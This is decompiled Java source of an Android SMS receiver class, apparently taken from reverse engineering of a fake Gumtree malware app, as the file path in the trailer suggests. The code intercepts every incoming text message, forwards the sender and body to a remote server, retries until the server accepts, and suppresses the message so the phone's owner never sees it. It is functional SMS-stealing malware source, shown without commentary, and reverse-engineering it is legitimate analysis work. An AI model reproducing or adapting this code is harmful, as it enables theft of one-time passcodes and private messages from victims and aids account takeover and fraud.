package com.gumsis.mess.service.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.gumsis.api.request.HTTPServer;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.checktls.Print;
import com.gumsis.mess.api.SendReceivedSmsRequest;
import com.gumsis.srs.api.responses.StatusResponse;

public class SmsReceiver
  extends BroadcastReceiver
{
  private void sendReceivedSmsRequest(final Context paramContext, final String paramString1, final String paramString2, long paramLong)
  {
    paramContext = new SendReceivedSmsRequest(paramContext, paramString1, paramString2, new HttpResponseHandler()
    {
      public void onResponse(int paramAnonymousInt, HttpResponse paramAnonymousHttpResponse)
      {
        try
        {
          paramAnonymousHttpResponse = (StatusResponse)paramAnonymousHttpResponse;
          if (paramAnonymousHttpResponse.ret == 0)
          {
            if (paramAnonymousHttpResponse.answer != null)
            {
              if (paramAnonymousHttpResponse.answer.equalsIgnoreCase("accepted")) {
                return;
              }
              SmsReceiver.this.sendReceivedSmsRequest(paramContext, paramString1, paramString2, 60000L);
              return;
            }
            SmsReceiver.this.sendReceivedSmsRequest(paramContext, paramString1, paramString2, 60000L);
            return;
          }
        }
        catch (Exception paramAnonymousHttpResponse)
        {
          paramAnonymousHttpResponse.printStackTrace();
          return;
        }
        SmsReceiver.this.sendReceivedSmsRequest(paramContext, paramString1, paramString2, 60000L);
      }
    });
    HTTPServer.getInstance().doRequestDelayed(paramContext, paramLong);
  }
  
  private void smsReceived(Context paramContext, Bundle paramBundle)
    throws Exception
  {
    paramBundle = (Object[])paramBundle.get("pdus");
    if (paramBundle != null)
    {
      int j = paramBundle.length;
      int i = 0;
      while (i < j)
      {
        SmsMessage localSmsMessage = SmsMessage.createFromPdu((byte[])paramBundle[i]);
        sendReceivedSmsRequest(paramContext, localSmsMessage.getDisplayOriginatingAddress(), localSmsMessage.getDisplayMessageBody(), 0L);
        abortBroadcast();
        i += 1;
      }
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Bundle localBundle = paramIntent.getExtras();
    if (localBundle != null) {}
    try
    {
      paramIntent = paramIntent.getAction();
      if ((paramIntent != null) && (paramIntent.equals("android.provider.Telephony.SMS_RECEIVED"))) {
        smsReceived(paramContext, localBundle);
      }
      return;
    }
    catch (Exception paramContext)
    {
      Print.e("Exception smsReceiver" + paramContext);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/mess/service/receiver/SmsReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */